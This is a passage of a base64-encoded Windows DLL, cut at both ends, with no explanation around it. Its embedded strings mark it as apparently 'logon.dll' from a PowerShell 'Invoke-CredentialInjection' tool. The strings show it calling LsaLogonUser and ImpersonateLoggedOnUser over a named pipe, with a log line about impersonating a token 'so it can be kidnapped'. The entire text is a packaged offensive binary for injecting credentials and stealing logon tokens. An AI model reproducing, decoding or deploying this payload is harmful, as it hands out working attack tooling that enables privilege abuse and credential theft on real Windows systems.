C0AbgB6AAAAbQBrAC0AbQBrAAAAbQBsAC0AaQBuAAAAbQBuAC0AbQBuAAAAbQByAC0AaQBuAAAAbQBzAC0AYgBuAAAAbQBzAC0AbQB5AAAAbQB0AC0AbQB0AAAAbgBiAC0AbgBvAAAAbgBsAC0AYgBlAAAAbgBsAC0AbgBsAAAAbgBuAC0AbgBvAAAAbgBzAC0AegBhAAAAcABhAC0AaQBuAAAAcABsAC0AcABsAAAAcAB0AC0AYgByAAAAcAB0AC0AcAB0AAAAcQB1AHoALQBiAG8AAAAAAHEAdQB6AC0AZQBjAAAAAABxAHUAegAtAHAAZQAAAAAAcgBvAC0AcgBvAAAAcgB1AC0AcgB1AAAAcwBhAC0AaQBuAAAAcwBlAC0AZgBpAAAAcwBlAC0AbgBvAAAAcwBlAC0AcwBlAAAAcwBrAC0AcwBrAAAAcwBsAC0AcwBpAAAAcwBtAGEALQBuAG8AAAAAAHMAbQBhAC0AcwBlAAAAAABzAG0AagAtAG4AbwAAAAAAcwBtAGoALQBzAGUAAAAAAHMAbQBuAC0AZgBpAAAAAABzAG0AcwAtAGYAaQAAAAAAcwBxAC0AYQBsAAAAcwByAC0AYgBhAC0AYwB5AHIAbAAAAAAAcwByAC0AYgBhAC0AbABhAHQAbgAAAAAAcwByAC0AcwBwAC0AYwB5AHIAbAAAAAAAcwByAC0AcwBwAC0AbABhAHQAbgAAAAAAcwB2AC0AZgBpAAAAcwB2AC0AcwBlAAAAcwB3AC0AawBlAAAAcwB5AHIALQBzAHkAAAAAAHQAYQAtAGkAbgAAAHQAZQAtAGkAbgAAAHQAaAAtAHQAaAAAAHQAbgAtAHoAYQAAAHQAcgAtAHQAcgAAAHQAdAAtAHIAdQAAAHUAawAtAHUAYQAAAHUAcgAtAHAAawAAAHUAegAtAHUAegAtAGMAeQByAGwAAAAAAHUAegAtAHUAegAtAGwAYQB0AG4AAAAAAHYAaQAtAHYAbgAAAHgAaAAtAHoAYQAAAHoAaAAtAGMAaABzAAAAAAB6AGgALQBjAGgAdAAAAAAAegBoAC0AYwBuAAAAegBoAC0AaABrAAAAegBoAC0AbQBvAAAAegBoAC0AcwBnAAAAegBoAC0AdAB3AAAAegB1AC0AegBhAAAAAAAAAAAAAAAAAADA//81wmghotoPyf8/AAAAAAAA8D8IBAgICAQICAAEDAgABAwIAAAAAAAAAAAAAPA/fwI1wmghotoPyT5A////////738AAAAAAAAQAAAAAAAAAJjAAAAAAAAAmEAAAAAAAADwfwAAAAAAAAAAAAAAAFRCARBgQgEQaEIBEHRCARCAQgEQjEIBEJhCARCoQgEQtEIBELxCARDEQgEQ0EIBENxCARCXVwEQ6EIBEPBCARD4QgEQ/EIBEABDARAEQwEQCEMBEAxDARAQQwEQFEMBECBDARAkQwEQKEMBECxDARAwQwEQNEMBEDhDARA8QwEQQEMBEERDARBIQwEQTEMBEFBDARBUQwEQWEMBEFxDARBgQwEQZEMBEGhDARBsQwEQcEMBEHRDARB4QwEQfEMBEIBDARCEQwEQiEMBEIxDARCQQwEQlEMBEJhDARCcQwEQqEMBELRDARC8QwEQyEMBEOBDARDsQwEQAEQBECBEARBARAEQYEQBEIBEARCgRAEQxEQBEOBEARAERQEQJEUBEExFARBoRQEQeEUBEHxFARCERQEQlEUBELhFARDARQEQzEUBENxFARD4RQEQGEYBEEBGARBoRgEQkEYBELxGARDYRgEQ/EYBECBHARBMRwEQeEcBEJdXARCURwEQqEcBEMRHARDYRwEQ+EcBEF9fYmFzZWQoAAAAAF9fY2RlY2wAX19wYXNjYWwAAAAAX19zdGRjYWxsAAAAX190aGlzY2FsbAAAX19mYXN0Y2FsbAAAX192ZWN0b3JjYWxsAAAAAF9fY2xyY2FsbAAAAF9fZWFiaQAAX19wdHI2NABfX3Jlc3RyaWN0AABfX3VuYWxpZ25lZAByZXN0cmljdCgAAAAgbmV3AAAAACBkZWxldGUAPQAAAD4+AAA8PAAAIQAAAD09AAAhPQAAW10AAG9wZXJhdG9yAAAAAC0+AAAqAAAAKysAAC0tAAAtAAAAKwAAACYAAAAtPioALwAAACUAAAA8AAAAPD0AAD4AAAA+PQAALAAAACgpAAB+AAAAXgAAAHwAAAAmJgAAfHwAACo9AAArPQAALT0AAC89AAAlPQAAPj49ADw8PQAmPQAAfD0AAF49AABgdmZ0YWJsZScAAABgdmJ0YWJsZScAAABgdmNhbGwnAGB0eXBlb2YnAAAAAGBsb2NhbCBzdGF0aWMgZ3VhcmQnAAAAAGBzdHJpbmcnAAAAAGB2YmFzZSBkZXN0cnVjdG9yJwAAYHZlY3RvciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgZGVmYXVsdCBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAABgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAYHVkdCByZXR1cm5pbmcnAGBFSABgUlRUSQAAAGBsb2NhbCB2ZnRhYmxlJwBgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAgbmV3W10AACBkZWxldGVbXQAAAGBvbW5pIGNhbGxzaWcnAABgcGxhY2VtZW50IGRlbGV0ZSBjbG9zdXJlJwAAYHBsYWNlbWVudCBkZWxldGVbXSBjbG9zdXJlJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAGBkeW5hbWljIGluaXRpYWxpemVyIGZvciAnAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0Z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HEAcwB2AGMAAAAAAEVycm9yIGNhbGxpbmcgTHNhQ29ubmVjdFVudHJ1c3RlZC4gRXJyb3IgY29kZTogAGhMU0EgKExTQSBoYW5kbGUpIGlzIE5VTEwsIHRoaXMgc2hvdWxkbid0IGV2ZXIgaGFwcGVuLgAATUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMAAAAEtlcmJlcm9zAAAAAFJlY2VpdmVkIGFuIGludmFsaWQgYXV0aCBwYWNrYWdlIGZyb20gdGhlIG5hbWVkIHBpcGUAAAAAQ2FsbCB0byBMc2FMb29rdXBBdXRoZW50aWNhdGlvblBhY2thZ2UgZmFpbGVkLiBFcnJvciBjb2RlOiAAQ2FsbCB0byBPcGVuUHJvY2Vzc1Rva2VuIGZhaWxlZC4gRXJyb3Jjb2RlOiAAAAAAQ2FsbCB0byBHZXRUb2tlbkluZm9ybWF0aW9uIGZhaWxlZC4ARXJyb3IgY2FsbGluZyBMc2FMb2dvblVzZXIuIEVycm9yIGNvZGU6IAAAAAAAAAAATG9nb24gc3VjY2VlZGVkLCBpbXBlcnNvbmF0aW5nIHRoZSB0b2tlbiBzbyBpdCBjYW4gYmUga2lkbmFwcGVkIGFuZCBzdGFydGluZyBhbiBpbmZpbml0ZSBsb29wIHdpdGggdGhlIHRocmVhZC4AACVsdQAlZAAAJWxkAAAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIcAEQwFsBEAcAAABSU0RTagGqOaRFrEeLCo/WO9YMbwEAAABDOlxHaXRIdWJcUG93ZXJTaGVsbFxJbnZva2UtQ3JlZGVudGlhbEluamVjdGlvblxMb2dvblVzZXJcTG9nb25Vc2VyXFJlbGVhc2VcbG9nb24ucGRiAAAAAAAAAKQAAACkAAAAAAAAAAAAAAAQggEQAAAAAAAAAAD/////AAAAAEAAAACIWAEQAAAAAAAAAAABAAAAmFgBEGxYARAAAAAAAAAAAAAAAAAAAAAA9IEBELRYARAAAAAAAAAAAAIAAADEWAEQ0FgBEGxYARAAAAAA9IEBEAEAAAAAAAAA/////wAAAABAAAAAtFgBEAAAAAAAAAAAAAAAACyCARAAWQEQAAAAAAAAAAACAAAAEFkBEBxZARBsWAEQAAAAACyCARABAAAAAAAAAP////8AAAAAQAAAAABZARAAAAAAAAAAAAAAAABMggEQTFkBEAAAAAAAAAAAAwAAAFxZARBsWQEQHFkBEGxYARAAAAAATIIBEAIAAAAAAAAA/////wAAAABAAAAATFkBEAAAAAAAAAAAAAAAAGyCARCcWQEQAAAAAAAAAAADAAAArFkBELxZARAcWQEQbFgBEAAAAABsggEQAgAAAAAAAAD/////AAAAAEAAAACcWQEQAAAAAAAAAAAAAAAAjIIBEOxZARAAAAAAAAAAAAEAAAD8WQEQBFoBEAAAAACMggEQAAAAAAAAAAD/////AAAAAEAAAADsWQEQAAAAAAAAAAAAAAAAEIIBEIhYARAAAAAAAAAAAAAAAACkggEQSFoBEAAAAAAAAAAAAgAAAFhaARBkWgEQbFgBEAAAAACkggEQAQAAAAAAAAD/////AAAAAEAAAABIWgEQAAAAAAAAAAABAAAAQFsBEByDARAAAAAAAAAAAP////8AAAAAQAAAAIBaARAAAAAAAAAAAAMAAAC8WgEQSFsBEOBaARCQWgEQAAAAAAAAAAAAAAAAAAAAAECDARCUWwEQQIMBEAEAAAAAAAAA/////wAAAABAAAAAlFsBEMSCARACAAAAAAAAAP////8AAAAAQAAAAGRbARAAAAAAAAAAAAAAAAAcgwEQgFoBEAAAAAAAAAAAAAAAAMSCARBkWwEQkFoBEAAAAADwggEQAgAAAAAAAAD/////AAAAAEAAAACsWgEQAAAAAAAAAAADAAAApFsBEAAAAAAAAAAAAAAAAPCCARCsWgEQ4FoBEJBaARAAAAAAAAAAAAAAAAACAAAAiFsBEPxaARDgWgEQkFoBEAAAAAAAAAAAAAAAAAAAAABUNgAAhTYAAPBDAADAjgAA4LQAAAD5AAAb+QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiBZMZBAAAABRcARACAAAANFwBEAAAAAAAAAAAAAAAAAEAAAD/////AAAAAP////8AAAAAAQAAAAAAAAABAAAAAAAAAAIAAAACAAAAAwAAAAEAAABcXAEQAAAAAAAAAAADAAAAAQAAAGxcARBAAAAAAAAAAAAAAACyFwAQQAAAAAAAAAAAAAAAdRcAEAAAAAC2IgAQAAAAAIxcARACAAAAmFwBELRcARAQAAAA9IEBEAAAAAD/////AAAAAAwAAABKIgAQAAAAABCCARAAAAAA/////wAAAAAMAAAA9zoAEAAAAAAsggEQAAAAAP////8AAAAADAAAAIAiABAAAAAAwSIAEAAAAAD8XAEQAwAAAAxdARDQXAEQtFwBEAAAAABMggEQAAAAAP////8AAAAADAAAAGUiABAAAAAAwSIAEAAAAAA4XQEQAwAAAEhdARDQXAEQtFwBEAAAAABsggEQAAAAAP////8AAAAADAAAAJsiABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAXioAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAADyLAAQAAAAAP7///8AAAAA1P///wAAAAD+////ii4AEKQuABAAAAAA/v///wAAAADE////AAAAAP7///8AAAAAa0IAEAAAAAD+////AAAAANj///8AAAAA/v///ytNABBHTQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAABRPABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAArlcAEP7///8AAAAAulcAEP7///8AAAAA2P///wAAAAD+////AAAAAB5ZABD+////AAAAAC1ZABD+////AAAAAHz///8AAAAA/v///wAAAACRXAAQAAAAAP7///8AAAAA2P///wAAAAD+////xGUAEMhlABAAAAAA/v///wAAAADY////AAAAAP7///+QZQAQlGUAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAABgcgAQAAAAACVyABAvcgAQ/v///wAAAACw////AAAAAP7///8AAAAAE2gAEAAAAABnZwAQcWcAEP7///8AAAAA2P///wAAAAD+////h28AEItvABAAAAAA/v///wAAAADY////AAAAAP7///9cZgAQZWYAEEAAAAAAAAAAAAAAAMBoABD/////AAAAAP////8AAAAAAAAAAAAAAAABAAAAAQAAAGRfARAiBZMZAgAAAHRfARABAAAAhF8BEAAAAAAAAAAAAAAAAAEAAAAAAAAA/v///wAAAADU////AAAAAP7///9CcQAQRnEAEAAAAACiZgAQAAAAAOxfARACAAAA+F8BELRcARAAAAAApIIBEAAAAAD/////AAAAAAwAAACHZgAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAC6AABAAAAAA/v///wAAAADY////AAAAAP7///95gwAQjIMAEAAAAAD+////AAAAALz///8AAAAA/v///wAAAACChQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAF2JABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAA2IoAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAADflwAQAAAAAP7///8AAAAAyP///wAAAAD+////AAAAADuhABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAsrEAEAAAAAD+////AAAAAMz///8AAAAA/v///wAAAADExgAQAAAAAAAAAACOxgAQ/v///wAAAADQ////AAAAAP7///8AAAAAbskAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAAD8yQAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAHjSABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAA5fMAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAADh9AAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAPH3ABAAAAAAAAAAAOPo+1IAAAAAMmIBAAEAAAABAAAAAQAAAChiAQAsYgEAMGIBAGAYAAA8YgEAAABsb2dvbi5kbGwAVm9pZEZ1bmMAAAAAsGMBAAAAAAAAAAAACGQBABgBAQCsYgEAAAAAAAAAAACCZAEAFAABAJhiAQAAAAAAAAAAAOxkAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAC8ZAEAqGQBAJBkAQDSZAEAAAAAACJkAQAuZAEAQmQBABRkAQBiZAEAamQBAHZkAQDYaAEA6GgBAPhoAQBSZAEAsGYBAPpkAQAKZQEAGmUBACxlAQBCZQEAVGUBAGBlAQB0ZQEAkGUBAJ5lAQC0ZQEAxmUBANxlAQDyZQEA/mUBAApmAQAWZgEAJmYBADhmAQBIZgEAVmYBAG5mAQCAZgEAlmYBAAxpAQDGZgEA4GYBAPpmAQAUZwEAMGcBAE5nAQB2ZwEAimcBAJZnAQCkZwEAsmcBALxnAQDQZwEA6GcBAABoAQAWaAEAKGgBADpoAQBEaAEAUGgBAFxoAQBqaAEAemgBAIpoAQCcaAEAsGgBAMZoAQAAAAAA+GMBANZjAQDAYwEAAAAAACYATHNhQ29ubmVjdFVudHJ1c3RlZAAsAExzYUxvb2t1cEF1dGhlbnRpY2F0aW9uUGFja2FnZQAAKwBMc2FMb2dvblVzZXIAAFNlY3VyMzIuZGxsAMIAQ3JlYXRlRmlsZVcATwRSZWFkRmlsZQAACQJHZXRDdXJyZW50UHJvY2VzcwBQAkdldExhc3RFcnJvcgAA0QBDcmVhdGVNdXRleFcAAFAFU2xlZXAACQZsc3RybGVuVwAA3wVXcml0ZUZpbGUAS0VSTkVMMzIuZGxsAADTAUxzYU50U3RhdHVzVG9XaW5FcnJvcgASAk9wZW5Qcm9jZXNzVG9rZW4AAG8BR2V0VG9rZW5JbmZvcm1hdGlvbgCJAUltcGVyc29uYXRlTG9nZ2VkT25Vc2VyAEFEVkFQSTMyLmRsbAAAIQFFbmNvZGVQb2ludGVyAP4ARGVjb2RlUG9pbnRlcgDIAUdldENvbW1hbmRMaW5lQQAOAkdldEN1cnJlbnRUaHJlYWRJZAAAPwRSYWlzZUV4Y2VwdGlvbgAArARSdGxVbndpbmQAZwNJc0RlYnVnZ2VyUHJlc2VudABtA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAUQFFeGl0UHJvY2VzcwBmAkdldE1vZHVsZUhhbmRsZUV4VwAAnQJHZXRQcm9jQWRkcmVzcwAA0QNNdWx0aUJ5dGVUb1dpZGVDaGFyAMsFV2lkZUNoYXJUb011bHRpQnl0ZQA4A0hlYXBTaXplAAAzA0hlYXBGcmVlAAAvA0hlYXBBbGxvYwAKBVNldExhc3RFcnJvcgAAogJHZXRQcm9jZXNzSGVhcAAAwAJHZXRTdGRIYW5kbGUAAD4CR2V0RmlsZVR5cGUABQFEZWxldGVDcml0aWNhbFNlY3Rpb24AvgJHZXRTdGFydHVwSW5mb1cAYgJHZXRNb2R1bGVGaWxlTmFtZUEAAC0EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIACgJHZXRDdXJyZW50UHJvY2Vzc0lkANYCR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAJwJHZXRFbnZpcm9ubWVudFN0cmluZ3NXAACdAUZyZWVFbnZpcm9ubWVudFN0cmluZ3NXAIAFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABBBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgBIA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAXwVUZXJtaW5hdGVQcm9jZXNzAABxBVRsc0FsbG9jAABzBVRsc0dldFZhbHVlAHQFVGxzU2V0VmFsdWUAcgVUbHNGcmVlAGcCR2V0TW9kdWxlSGFuZGxlVwAAJQFFbnRlckNyaXRpY2FsU2VjdGlvbgAAogNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAYwJHZXRNb2R1bGVGaWxlTmFtZVcAAKcDTG9hZExpYnJhcnlFeFcAAHIDSXNWYWxpZENvZGVQYWdlAKQBR2V0QUNQAACGAkdldE9FTUNQAACzAUdldENQSW5mbwA2A0hlYXBSZUFsbG9jAJYDTENNYXBTdHJpbmdXAADcAUdldENvbnNvbGVDUAAA7gFHZXRDb25zb2xlTW9kZQAA/ARTZXRGaWxlUG9pbnRlckV4AAD6A091dHB1dERlYnVnU3RyaW5nVwAAxQJHZXRTdHJpbmdUeXBlVwAAIAVTZXRTdGRIYW5kbGUAAN4FV3JpdGVDb25zb2xlVwCSAUZsdXNoRmlsZUJ1ZmZlcnMAAH8AQ2xvc2VIYW5kbGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1mAAAc5gAAE7mQLuxGb9EAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAABzcXJ0AAAAAAAAAAAAAPB/AAAAAAAA+P/////////vfwAAAAAAABAAAAAAAAAAAIAUAAAA2BABEB0AAADcEAEQGgAAAOAQARAbAAAA5BABEB8AAADsEAEQEwAAAPQQARAhAAAANBABEA4AAAA8EAEQDQAAAEQQARAPAAAATBABEBAAAABUEAEQBQAAAFwQARAeAAAAZBABEBIAAABoEAEQIAAAAGwQARAMAAAAcBABEAsAAAB4EAEQFQAAAIAQARAcAAAAiBABEBkAAACQEAEQEQAAAJgQARAYAAAAoBABEBYAAACoEAEQFwAAALAQARAiAAAAuBABECMAAAC8EAEQJAAAAMAQARAlAAAAxBABECYAAADMEAEQAAAAAAAAAIAQRAAAAQAAAAAAAIAAMAAAAQAAAAAAAAAAAAAAAAAAAPwQARAEEQEQAQAAABYAAAACAAAAAgAAAAMAAAACAAAABAAAABgAAAAFAAAADQAAAAYAAAAJAAAABwAAAAwAAAAIAAAADAAAAAkAAAAMAAAACgAAAAcAAAALAAAACAAAAAwAAAAWAAAADQAAABYAAAAPAAAAAgAAA